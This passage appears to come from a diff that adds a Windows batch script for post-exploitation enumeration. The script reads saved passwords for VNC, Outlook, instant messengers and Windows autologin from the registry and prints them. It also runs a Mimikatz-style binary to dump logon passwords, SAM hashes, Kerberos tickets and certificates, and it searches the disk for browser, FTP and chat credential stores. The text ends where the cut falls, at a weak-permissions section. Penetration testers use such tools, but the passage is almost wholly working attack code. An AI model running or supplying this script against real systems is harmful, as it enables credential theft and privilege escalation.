+</span><span>reg query &quot;HKCU\SOFTWARE\Microsoft\Protected Storage System Provider&quot; /v &quot;Protected Storage&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set IE6found=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set IE7found=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\America Online\AIM6\Passwords&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set AIM6found=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\AIM\AIMPRO&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set AIMPROfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Beyluxe Messenger&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set BEYLUXEfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set BIGANTfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Camfrog\Client&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set CAMFROGfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Google\Google Talk\Accounts&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set GOOGLETALKfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\IMVU&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set IMVUfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Nimbuzz\PCClient\Application&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set NIMBUZZfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Paltalk&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set PALTALKfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Yahoo\Pager&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set YAHOOPAGERfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\IncrediMail&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set INCREDIMAILfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set OUTLOOK2013found=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set OUTLOOK2010POSTNTfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set OUTLOOK2010PRENTfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set OUTLOOK98MAILONLYfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set OUTLOOK98NORMALfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Adobe\Common\10\Sites&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set DREAMWEAVERfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set GMAILDESKTOPfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\DownloadManager\Passwords&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set IDMfound=1)
+</span><span>reg query &quot;HKCU\SOFTWARE\Google\Picasa&quot; 1&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (set PICASAfound=1)
+</span><span>reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password | Find &quot;Password&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (set realvncpassfound=1)
+</span><span>reg query HKLM\Software\TightVNC\Server /v Password | Find &quot;Password&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (set tightvncpassfound1=1)
+</span><span>reg query HKLM\Software\TightVNC\Server /v PasswordViewOnly | Find &quot;PasswordViewOnly&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (set tightvncpassfound2=1)
+</span><span>reg query HKLM\Software\TigerVNC\WinVNC4 /v Password | Find &quot;Password&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (set tigervncpassfound=1)
+</span><span>reg query HKLM\SOFTWARE\ORL\WinVNC3\Default /v Password | Find &quot;Password&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (set vnc3passfound1=1)
+</span><span>reg query HKLM\SOFTWARE\ORL\WinVNC3 /v Password | Find &quot;Password&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (set vnc3passfound2=1)
+</span><span>reg query HKCU\Software\ORL\WinVNC3 /v Password | Find &quot;Password&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (set vnc3passfound3=1)
+</span><span>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; /v DefaultPassword | Find &quot;DefaultPassword&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (
+</span><span>	For /F &quot;Tokens=2*&quot; %%a In (&#39;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; /v DefaultPassword&#39;) Do set defaultloginpass=%%b	
+</span><span>	REM we check if the registry key is not null
+</span><span>	IF NOT [%defaultloginpass%] == [] set winautologinpassfound=1
+</span><span>	set defaultloginpass=
+</span><span>)
+</span><span>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; /v DefaultUsername | Find &quot;DefaultUsername&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (set winautologinuserfound=1)
+</span><span>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; /v DefaultDomainname | Find &quot;DefaultDomainname&quot; 1&gt; NUL
+</span><span>IF %ERRORLEVEL% == 0 (set winautologindomainfound=1)
+</span><span>REM
+</span><span>REM
+</span><span>echo ====================== IGNORE THESE ERRORS =========================
+</span><span>echo ====================================================================
+</span><span>echo.
+</span><span>goto:eof
+</span><span>
+</span><span>:CheckOSVersion
+</span><span>@echo off
+</span><span>ver | find &quot;2003&quot; &gt; nul
+</span><span>if %ERRORLEVEL% == 0 goto ver_2003
+</span><span>ver | find &quot;XP&quot; &gt; nul
+</span><span>if %ERRORLEVEL% == 0 goto ver_xp
+</span><span>ver | find &quot;2000&quot; &gt; nul
+</span><span>if %ERRORLEVEL% == 0 goto ver_2000
+</span><span>ver | find &quot;NT&quot; &gt; nul
+</span><span>if %ERRORLEVEL% == 0 goto ver_nt
+</span><span>if not exist %SystemRoot%\system32\systeminfo.exe goto versioncheckwarnthenexit
+</span><span>systeminfo | find &quot;OS Name&quot; &gt; %TEMP%\osname.txt
+</span><span>FOR /F &quot;usebackq delims=: tokens=2&quot; %%i IN (%TEMP%\osname.txt) DO set vers=%%i
+</span><span>echo %vers% | find &quot;Windows 7&quot; &gt; nul
+</span><span>if %ERRORLEVEL% == 0 goto ver_7
+</span><span>echo %vers% | find &quot;Windows Server 2008&quot; &gt; nul
+</span><span>if %ERRORLEVEL% == 0 goto ver_2008
+</span><span>echo %vers% | find &quot;Windows Vista&quot; &gt; nul
+</span><span>if %ERRORLEVEL% == 0 goto ver_vista
+</span><span>goto warnthenexit
+</span><span>:ver_7
+</span><span>:Run Windows 7 specific commands here.
+</span><span>set OSVersion=WIN7
+</span><span>goto versioncheckexit
+</span><span>:ver_2008
+</span><span>:Run Windows Server 2008 specific commands here.
+</span><span>set OSVersion=WIN2008
+</span><span>goto versioncheckexit
+</span><span>:ver_vista
+</span><span>:Run Windows Vista specific commands here.
+</span><span>set OSVersion=WINVISTA
+</span><span>goto versioncheckexit
+</span><span>:ver_2003
+</span><span>:Run Windows Server 2003 specific commands here.
+</span><span>set OSVersion=WIN2003
+</span><span>goto versioncheckexit
+</span><span>:ver_xp
+</span><span>:Run Windows XP specific commands here.
+</span><span>set OSVersion=WINXP
+</span><span>goto versioncheckexit
+</span><span>:ver_2000
+</span><span>:Run Windows 2000 specific commands here.
+</span><span>set OSVersion=WIN2000
+</span><span>goto versioncheckexit
+</span><span>:ver_nt
+</span><span>:Run Windows NT specific commands here.
+</span><span>set OSVersion=WINNT
+</span><span>goto versioncheckexit
+</span><span>:versioncheckwarnthenexit
+</span><span>set OSVersion=UNDETERMINED
+</span><span>goto:versioncheckexit
+</span><span>:versioncheckexit
+</span><span>goto:eof
+</span><span>
+</span><span>:checkquickwins
+</span><span>	systeminfo &gt; systeminfo.txt
+</span><span>	REM === Generic tests across all Windows versions here
+</span><span>	IF DEFINED alwaysinstallelevated (
+</span><span>		echo **** !!! VULNERABLE TO ALWAYSINSTALLELEVATED !!! ****
+</span><span>		set alwaysinstallelevated=
+</span><span>		echo.
+</span><span>	)
+</span><span>	IF DEFINED realvncpassfound (
+</span><span>		echo **** !!! REALVNC PASS FOUND !!! ****
+</span><span>		reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password | Find &quot;Password&quot;
+</span><span>		echo ************************************
+</span><span>		set realvncpassfound=
+</span><span>		echo.
+</span><span>	)
+</span><span>	IF DEFINED tightvncpassfound1 (
+</span><span>		echo **** !!! TIGHTVNC PASS FOUND !!! ****
+</span><span>		reg query HKLM\Software\TightVNC\Server /v Password | Find &quot;Password&quot;
+</span><span>		echo *************************************
+</span><span>		set tightvncpassfound1=
+</span><span>		echo.
+</span><span>	)
+</span><span>	IF DEFINED tightvncpassfound2 (
+</span><span>		echo **** !!! TIGHTVNC VIEWONLY PASS FOUND !!! ****
+</span><span>		reg query HKLM\Software\TightVNC\Server /v PasswordViewOnly | Find &quot;PasswordViewOnly&quot;
+</span><span>		echo **********************************************
+</span><span>		set tightvncpassfound2=
+</span><span>		echo.
+</span><span>	)
+</span><span>	IF DEFINED tigervncpassfound (
+</span><span>		echo **** !!! TIGERVNC PASS FOUND !!! ****
+</span><span>		reg query HKLM\Software\TigerVNC\WinVNC4 /v Password | Find &quot;Password&quot;
+</span><span>		echo *************************************
+</span><span>		set tigervncpassfound=
+</span><span>		echo.
+</span><span>	)
+</span><span>	IF DEFINED vnc3passfound1 (
+</span><span>		echo **** !!! VNC3 PASS FOUND !!! ****
+</span><span>		reg query HKLM\SOFTWARE\ORL\WinVNC3\Default /v Password | Find &quot;Password&quot;
+</span><span>		echo *********************************
+</span><span>		set vnc3passfound1=
+</span><span>		echo.
+</span><span>	)
+</span><span>	IF DEFINED vnc3passfound2 (
+</span><span>		echo **** !!! VNC3 PASS FOUND !!! ****
+</span><span>		reg query HKLM\SOFTWARE\ORL\WinVNC3 /v Password | Find &quot;Password&quot;
+</span><span>		echo *********************************
+</span><span>		set vnc3passfound2=
+</span><span>		echo.
+</span><span>	)
+</span><span>	IF DEFINED vnc3passfound3 (
+</span><span>		echo **** !!! VNC3 PASS FOUND !!! ****
+</span><span>		reg query HKCU\Software\ORL\WinVNC3 /v Password | Find &quot;Password&quot;
+</span><span>		echo *********************************
+</span><span>		set vnc3passfound3=
+</span><span>		echo.
+</span><span>	)
+</span><span>	IF DEFINED winautologinpassfound (
+</span><span>		echo **** !!! WINDOWS AUTOLOGIN PASS FOUND !!! ****
+</span><span>		reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; /v DefaultPassword | Find &quot;DefaultPassword&quot;
+</span><span>		echo **********************************************
+</span><span>
+</span><span>		IF DEFINED Winautologinuserfound (
+</span><span>			reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; /v DefaultUsername | Find &quot;DefaultUsername&quot;
+</span><span>			set winautologinuserfound=
+</span><span>		)
+</span><span>
+</span><span>		IF DEFINED winautologindomainfound (
+</span><span>			reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; /v DefaultDomainname | Find &quot;DefaultDomainname&quot;
+</span><span>			set winautologindomainfound=
+</span><span>		)
+</span><span>
+</span><span>		set winautologinpassfound=
+</span><span>	)
+</span><span>goto:eof
+</span><span>	if %OSVersion%==WINXP (
+</span><span>		REM Maybe we can do something nice with this, haven&#39;t found a really good use yet other than it does work, too many KB&#39;s and interdependencies on KB patches
+</span><span>		REM for /f &quot;tokens=1 delims=&quot; %%a in (&#39;type systeminfo.txt ^| findstr /C:&quot;KB147222&quot;&#39;) do set MYKB=%%a
+</span><span>		REM if NOT DEFINED MYKB echo == VULNERABLE TO KBasfjsdfj
+</span><span>		REM set MYKB=
+</span><span>		REM echo.
+</span><span>	)
+</span><span>goto:eof
+</span><span>
+</span><span>:getfirewallinformation
+</span><span>echo.
+</span><span>IF DEFINED netshfirewall (
+</span><span>		echo.
+</span><span>		echo.Firewall Status
+</span><span>		echo.---------------
+</span><span>		netsh firewall show state
+</span><span>		echo.
+</span><span>		echo.
+</span><span>		echo.Firewall configuration details
+</span><span>		echo.------------------------------
+</span><span>		echo.
+</span><span>		netsh firewall show config
+</span><span>		echo.
+</span><span>	) ELSE (
+</span><span>		echo === NOTE: The netsh firewall command was not found, skipping checks ===
+</span><span>	)
+</span><span>echo.
+</span><span>goto:eof
+</span><span>
+</span><span>:getcomputerinformation
+</span><span>echo.
+</span><span>echo.This computer is running %OSbit%-bit Windows
+</span><span>echo.
+</span><span>IF DEFINED whoami (
+</span><span>	echo.
+</span><span>	echo.Are we running an elevated command prompt?
+</span><span>	echo.------------------------------------------
+</span><span>	for /f &quot;tokens=1 delims=&quot; %%a in (&#39;whoami /groups ^| findstr \.*High.Man&#39;) do set runningelevatedprompt=%%a
+</span><span>		IF DEFINED runningelevatedprompt (
+</span><span>				echo YES, we ARE!
+</span><span>			) ELSE (
+</span><span>				echo Sadly, no...
+</span><span>			)
+</span><span>		echo.
+</span><span>		echo.User Groups
+</span><span>		echo.-----------
+</span><span>		whoami /groups
+</span><span>		echo.
+</span><span>	) ELSE (
+</span><span>		echo === NOTE: The whoami command was not found, skipping checks ===
+</span><span>	)
+</span><span>echo.
+</span><span>echo.User Accounts
+</span><span>echo.-------------
+</span><span>net users
+</span><span>echo.
+</span><span>echo.Systeminfo
+</span><span>echo.----------
+</span><span>systeminfo
+</span><span>echo.
+</span><span>echo.Netstat -ano
+</span><span>echo.------------
+</span><span>netstat -ano
+</span><span>echo.
+</span><span>echo.Scheduled tasks
+</span><span>echo.---------------
+</span><span>schtasks /query /fo LIST /v
+</span><span>echo.
+</span><span>echo.Task to service mapping
+</span><span>echo.-----------------------
+</span><span>tasklist /SVC
+</span><span>echo.
+</span><span>echo.Network settings
+</span><span>echo.----------------
+</span><span>ipconfig /all
+</span><span>echo.
+</span><span>echo.Running windows services
+</span><span>echo.------------------------
+</span><span>net start
+</span><span>echo.
+</span><span>echo.Listing Windows drivers
+</span><span>echo.-----------------------
+</span><span>DRIVERQUERY
+</span><span>echo.
+</span><span>echo.Dumping Windows registry to registrydump.txt
+</span><span>echo.--------------------------------------------
+</span><span>reg query HKLM /s &gt; registrydump.txt
+</span><span>reg query HKCU /s &gt;&gt; registrydump.txt
+</span><span>echo.
+</span><span>echo.Environment variables
+</span><span>echo.---------------------
+</span><span>set
+</span><span>echo.
+</span><span>echo.Group Policy
+</span><span>echo.------------
+</span><span>gpresult /R 1&gt;2&gt;NUL
+</span><span>IF %ERRORLEVEL% == 1 (
+</span><span>	REM WINXP
+</span><span>	gpresult
+</span><span>) ELSE (
+</span><span>	REM WIN7
+</span><span>	gpresult /R
+</span><span>)
+</span><span>echo.
+</span><span>REM ** ALEX TO ADD CREDENUMERATE **
+</span><span>goto:eof
+</span><span>
+</span><span>:dumphashespasseskerberoscerts
+</span><span>echo.Hashes, passwords, kerberos tickets and certificates
+</span><span>echo.-----------------
+</span><span>IF NOT DEFINED jollykatz echo === NOTE: Jollykatz%OSbit%.exe not found, skipping jollykatz checks ===
+</span><span>IF NOT DEFINED jollykatz goto:eof
+</span><span>echo.
+</span><span>echo.sekurlsa::logonPasswords full
+</span><span>echo.------
+</span><span>jollykatz%OSbit%.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;
+</span><span>echo.
+</span><span>echo.lsadump::sam
+</span><span>echo.------
+</span><span>jollykatz%OSbit%.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;
+</span><span>echo.
+</span><span>echo.sekurlsa::tickets /export
+</span><span>echo.------
+</span><span>jollykatz%OSbit%.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::tickets /export&quot; &quot;exit&quot;
+</span><span>echo.
+</span><span>echo.crypto::certificates /export (CERT_SYSTEM_STORE_CURRENT_USER)
+</span><span>echo.------
+</span><span>jollykatz%OSbit%.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;crypto::capi&quot; &quot;crypto::cng&quot; &quot;crypto::certificates /systemstore:CERT_SYSTEM_STORE_CURRENT_USER /store:my /export&quot; &quot;exit&quot;
+</span><span>echo.
+</span><span>echo.crypto::certificates /export (CERT_SYSTEM_STORE_LOCAL_MACHINE)
+</span><span>echo.------
+</span><span>jollykatz%OSbit%.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;crypto::capi&quot; &quot;crypto::cng&quot; &quot;crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:my /export&quot; &quot;exit&quot;
+</span><span>echo.
+</span><span>echo.crypto::certificates /export (CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE)
+</span><span>echo.------
+</span><span>jollykatz%OSbit%.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;crypto::capi&quot; &quot;crypto::cng&quot; &quot;crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE /store:my /export&quot; &quot;exit&quot;
+</span><span>echo.
+</span><span>echo.crypto::certificates /export (CERT_SYSTEM_STORE_USERS)
+</span><span>echo.------
+</span><span>jollykatz%OSbit%.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;crypto::capi&quot; &quot;crypto::cng&quot; &quot;crypto::certificates /systemstore:CERT_SYSTEM_STORE_USERS /store:my /export&quot; &quot;exit&quot;
+</span><span>echo.
+</span><span>goto:eof
+</span><span>
+</span><span>:findinterestingfiles
+</span><span>echo.Interesting files and directories
+</span><span>echo.---------------------------------
+</span><span>dir C:\* /a/s/b &gt; dirlisting.txt
+</span><span>type dirlisting.txt | findstr /I \.*proof[.]txt$
+</span><span>type dirlisting.txt | findstr /I \.*network-secret[.]txt$
+</span><span>type dirlisting.txt | findstr /I \.*ssh.*[.]ini$
+</span><span>type dirlisting.txt | findstr /I \.*ultravnc[.]ini$
+</span><span>type dirlisting.txt | findstr /I \.*vnc[.]ini$
+</span><span>type dirlisting.txt | findstr /I \.*bthpan[.]sys$
+</span><span>type dirlisting.txt | findstr /I \.*\\repair$
+</span><span>type dirlisting.txt | findstr /I \.*passw*. | findstr /VI \.*.chm$ | findstr /VI \.*.log$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$
+</span><span>type dirlisting.txt | findstr /I \.*[.]vnc$
+</span><span>type dirlisting.txt | findstr /I \.*groups[.]xml$
+</span><span>type dirlisting.txt | findstr /I \.*printers[.]xml$
+</span><span>type dirlisting.txt | findstr /I \.*drives[.]xml$
+</span><span>type dirlisting.txt | findstr /I \.*scheduledtasks[.]xml$
+</span><span>type dirlisting.txt | findstr /I \.*services[.]xml$
+</span><span>type dirlisting.txt | findstr /I \.*datasources[.]xml$
+</span><span>type dirlisting.txt | findstr /I \.*.rsa.*[.].*$ | findstr /VI \.*.dll$ | findstr /VI \.*.rat$
+</span><span>type dirlisting.txt | findstr /I \.*.dsa.*[.].*$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$ | findstr /VI \.*.gif$ | findstr /VI \.*.handsafe[.]reg$
+</span><span>type dirlisting.txt | findstr /I \.*[.]dbx$
+</span><span>type dirlisting.txt | findstr /I \.*.account.*.$ | findstr /VI \.*.User.Account.Picture.*. | findstr /VI \.*.bmp$
+</span><span>type dirlisting.txt | findstr /I \.*ntds[.].*$
+</span><span>type dirlisting.txt | findstr /I \.*hiberfil[.].*$
+</span><span>type dirlisting.txt | findstr /I \.*boot[.]ini$
+</span><span>type dirlisting.txt | findstr /I \.*win[.]ini$
+</span><span>type dirlisting.txt | findstr /I \.*.\\config\\RegBack
+</span><span>type dirlisting.txt | findstr /I \.*.\\CCM\\logs
+</span><span>type dirlisting.txt | findstr /I \.*.\\iis.[.]log$
+</span><span>type dirlisting.txt | findstr /I \.*.\\Content.IE.\\index.dat$
+</span><span>type dirlisting.txt | findstr /I \.*.\\inetpub\\logs\\LogFiles
+</span><span>type dirlisting.txt | findstr /I \.*.\\httperr\\httpe.*.[.]log$
+</span><span>type dirlisting.txt | findstr /I \.*.\\logfiles\\w3svc1\\ex.*.[.]log$
+</span><span>type dirlisting.txt | findstr /I \.*.\\Panther\\ | findstr /VI \.*.Resources\\Themes\\.*.
+</span><span>type dirlisting.txt | findstr /I \.*.syspre.*,[.]...$
+</span><span>type dirlisting.txt | findstr /I \.*.unatten.*.[.]txt$
+</span><span>type dirlisting.txt | findstr /I \.*.unatten.*.[.]xml$
+</span><span>type dirlisting.txt | findstr /I \.*Login.Data$
+</span><span>type dirlisting.txt | findstr /I \.*Web.Data$
+</span><span>type dirlisting.txt | findstr /I \.*Credentials.Store$
+</span><span>type dirlisting.txt | findstr /I \.*Credential.Store$
+</span><span>type dirlisting.txt | findstr /I \.*Microsoft\\Credentials.*
+</span><span>REM Avant Browser:
+</span><span>type dirlisting.txt | findstr /I \.*forms[.]dat[.]vdt$
+</span><span>type dirlisting.txt | findstr /I \.*default\\formdata\\forms[.]dat$
+</span><span>REM Comodo Dragon
+</span><span>type dirlisting.txt | findstr /I \.*Dragon\\User.Data\\Default.*
+</span><span>REM CoolNovo
+</span><span>type dirlisting.txt | findstr /I \.*ChromePlus\\User.Data\\Default.*
+</span><span>REM Firefox
+</span><span>type dirlisting.txt | findstr /I \.*Firefox\\Profiles\\.*[.]default$
+</span><span>type dirlisting.txt | findstr /I \.*key3[.]db$
+</span><span>REM Flock Browser
+</span><span>type dirlisting.txt | findstr /I \.*Flock\\User.Data\\Default.*
+</span><span>REM Google Chrome
+</span><span>type dirlisting.txt | findstr /I \.*Chrome\\User.Data\\Default.*
+</span><span>type dirlisting.txt | findstr /I \.*Chrome.SXS\\User.Data\\Default.*
+</span><span>REM Internet Explorer
+</span><span>type dirlisting.txt | findstr /I \.*Microsoft\\Credentials.*
+</span><span>REM Maxthon
+</span><span>type dirlisting.txt | findstr /I \.*MagicFill.*
+</span><span>type dirlisting.txt | findstr /I \.*MagicFill2[.]dat$
+</span><span>REM Opera
+</span><span>type dirlisting.txt | findstr /I \.*Wand[.]dat$
+</span><span>REM Safari
+</span><span>type dirlisting.txt | findstr /I \.*keychain[.]plist$
+</span><span>REM SeaMonkey
+</span><span>type dirlisting.txt | findstr /I \.*signons[.]sqlite$
+</span><span>REM AIM
+</span><span>type dirlisting.txt | findstr /I \.*aimx[.]bin$
+</span><span>REM Digsby
+</span><span>type dirlisting.txt | findstr /I \.*logininfo[.]yaml$
+</span><span>type dirlisting.txt | findstr /I \.*digsby[.]dat$
+</span><span>REM Meebo Notifier
+</span><span>type dirlisting.txt | findstr /I \.*MeeboAccounts[.]txt$
+</span><span>REM Miranda IM
+</span><span>type dirlisting.txt | findstr /I \.*Miranda\\.*[.]dat$
+</span><span>REM MySpace IM
+</span><span>type dirlisting.txt | findstr /I \.*MySpace\\IM\\users[.]txt$
+</span><span>REM Pidgin
+</span><span>type dirlisting.txt | findstr /I \.*Accounts[.]xml$
+</span><span>REM Skype
+</span><span>type dirlisting.txt | findstr /I \.*Skype.*config[.]xml$
+</span><span>REM Tencent QQ
+</span><span>type dirlisting.txt | findstr /I \.*Registry[.]db$
+</span><span>REM Trillian
+</span><span>type dirlisting.txt | findstr /I \.*accounts[.]ini$
+</span><span>REM XFire
+</span><span>type dirlisting.txt | findstr /I \.*XfireUser[.]ini$
+</span><span>REM Foxmail
+</span><span>type dirlisting.txt | findstr /I \.*Account[.]stg$
+</span><span>type dirlisting.txt | findstr /I \.*Accounts[.]tdat$
+</span><span>REM ThunderBird
+</span><span>type dirlisting.txt | findstr /I \.*signons[.]sqlite$
+</span><span>REM Windows Live Mail
+</span><span>type dirlisting.txt | findstr /I \.*[.]oeaccount$
+</span><span>REM FileZilla
+</span><span>type dirlisting.txt | findstr /I \.*recentservers[.]xml$
+</span><span>REM FlashFXP
+</span><span>type dirlisting.txt | findstr /I \.*Sites[.]dat$
+</span><span>REM FTPCommander
+</span><span>type dirlisting.txt | findstr /I \.*Ftplist[.]txt$
+</span><span>REM SmartFTP
+</span><span>type dirlisting.txt | findstr /I \.*SmartFTP.*[.]xml$
+</span><span>REM WS_FTP
+</span><span>type dirlisting.txt | findstr /I \.*ws_ftp[.]ini$
+</span><span>REM Heroes of Newerth
+</span><span>type dirlisting.txt | findstr /I \.*login[.]cfg$
+</span><span>REM JDownloader
+</span><span>type dirlisting.txt | findstr /I \.*JDownloader.*
+</span><span>type dirlisting.txt | findstr /I \.*database[.]script$
+</span><span>type dirlisting.txt | findstr /I \.*accounts[.]ejs$
+</span><span>REM OrbitDownloader
+</span><span>type dirlisting.txt | findstr /I \.*sitelogin[.]dat$
+</span><span>REM Seesmic
+</span><span>type dirlisting.txt | findstr /I \.*data[.]db$
+</span><span>REM SuperPutty
+</span><span>type dirlisting.txt | findstr /I \.*sessions[.]xml$
+</span><span>REM TweetDeck
+</span><span>type dirlisting.txt | findstr /I \.*TweetDeck.*
+</span><span>type dirlisting.txt | findstr /I \.*[.]localstorage$
+</span><span>echo.
+</span><span>goto:eof
+</span><span>
+</span><span>:findinterestingregistrykeys
+</span><span>REM Source: securityxploded dot com slash passwordsecrets dot php
+</span><span>IF EXIST AIM6found (reg query &quot;HKCU\SOFTWARE\America Online\AIM6\Passwords&quot;)
+</span><span>IF EXIST AIMPROfound (reg query &quot;HKCU\SOFTWARE\AIM\AIMPRO&quot;)
+</span><span>IF EXIST IE6found (reg query &quot;HKCU\SOFTWARE\Microsoft\Protected Storage System Provider&quot; /v &quot;Protected Storage&quot;)
+</span><span>IF EXIST IE7found (reg query &quot;HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2&quot;)
+</span><span>IF EXIST BEYLUXEfound (reg query &quot;HKCU\SOFTWARE\Beyluxe Messenger&quot;)
+</span><span>IF EXIST BIGANTfound (reg query &quot;HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting&quot;)
+</span><span>IF EXIST CAMFROGfound (reg query &quot;HKCU\SOFTWARE\Camfrog\Client&quot;)
+</span><span>IF EXIST GOOGLETALKfound (reg query &quot;HKCU\SOFTWARE\Google\Google Talk\Accounts&quot;)
+</span><span>IF EXIST IMVUfound (reg query &quot;HKCU\SOFTWARE\IMVU&quot;)
+</span><span>IF EXIST NIMBUZZfound (reg query &quot;HKCU\SOFTWARE\Nimbuzz\PCClient\Application&quot;)
+</span><span>IF EXIST PALTALKfound (reg query &quot;HKCU\SOFTWARE\Paltalk&quot;)
+</span><span>IF EXIST YAHOOPAGERfound (reg query &quot;HKCU\SOFTWARE\Yahoo\Pager&quot;)
+</span><span>IF EXIST INCREDIMAIL (reg query &quot;HKCU\SOFTWARE\IncrediMail&quot;)
+</span><span>IF EXIST OUTLOOK2013found (reg query &quot;HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook&quot;)
+</span><span>IF EXIST OUTLOOK2010POSTNTfound (reg query &quot;HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles&quot;)
+</span><span>IF EXIST OUTLOOK2010PRENTfound (reg query &quot;HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles&quot;)
+</span><span>IF EXIST OUTLOOK98MAILONLYfound (reg query &quot;HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts&quot;)
+</span><span>IF EXIST OUTLOOK98NORMALfound (reg query &quot;HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts&quot;)
+</span><span>IF EXIST DREAMWEAVERfound (reg query &quot;HKCU\SOFTWARE\Adobe\Common\10\Sites&quot;)
+</span><span>IF EXIST GMAILDESKTOPfound (reg query &quot;HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail&quot;)
+</span><span>IF EXIST IDMfound (reg query &quot;HKCU\SOFTWARE\DownloadManager\Passwords&quot;)
+</span><span>IF EXIST PICASAfound (reg query &quot;HKCU\SOFTWARE\Google\Picasa&quot;)
+</span><span>REM
+</span><span>
+</span><span>:findpasswords
+</span><span>echo.Searching for passwords (this can take a while)
+</span><span>echo.-----------------------------------------------
+</span><span>findstr /si pwd= *.xml *.ini *.txt
+</span><span>findstr /si password= *.xml *.ini *.txt
+</span><span>findstr /si pass= *.xml *.ini *.txt
+</span><span>goto:eof
+</span><span>
+</span><span>:checkweakpermissions
